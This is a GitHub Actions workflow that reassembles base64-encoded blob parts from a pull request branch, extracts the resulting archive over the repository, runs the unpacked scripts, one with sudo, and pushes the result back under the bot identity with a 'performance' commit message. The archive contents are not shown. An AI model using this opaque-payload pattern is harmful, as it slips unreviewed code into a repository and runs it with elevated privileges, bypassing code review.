name: Bootstrap BaiZe v1.0.3

on:
  pull_request:
    branches:
      - main
  workflow_dispatch:

permissions:
  contents: write

jobs:
  bootstrap:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout performance branch
        uses: actions/checkout@v4
        with:
          ref: ${{ github.head_ref || github.ref_name }}
          fetch-depth: 0

      - name: Detect bootstrap payload
        id: payload
        shell: bash
        run: |
          if [ -f .bootstrap/v103.part-00 ]; then
            echo 'present=true' >> "$GITHUB_OUTPUT"
          else
            echo 'present=false' >> "$GITHUB_OUTPUT"
          fi

      - name: Restore optimized source
        if: steps.payload.outputs.present == 'true'
        shell: bash
        run: |
          set -euo pipefail
          cat .bootstrap/v103.part-* | base64 --decode > /tmp/BaiZe-v1.0.3-changes.tar.xz
          echo '49a8b63674c4fe3bfd3a486f7cfd4ca2cb20bb683572f6cc747260e6b58b590e  /tmp/BaiZe-v1.0.3-changes.tar.xz' | sha256sum --check --strict
          tar -xJf /tmp/BaiZe-v1.0.3-changes.tar.xz -C .
          chmod 0755 ./*.sh scripts/*.sh

      - name: Validate source and rules
        if: steps.payload.outputs.present == 'true'
        run: sh scripts/check.sh

      - name: Run performance smoke test
        if: steps.payload.outputs.present == 'true'
        run: sudo env PATH="$PATH" sh scripts/smoke-test.sh

      - name: Build module
        if: steps.payload.outputs.present == 'true'
        run: sh scripts/build.sh

      - name: Publish optimized source to branch
        if: steps.payload.outputs.present == 'true'
        shell: bash
        run: |
          set -euo pipefail
          rm -rf .bootstrap
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git commit -m 'Optimize deep scan performance for v1.0.3'
          git push origin HEAD:${{ github.head_ref }}
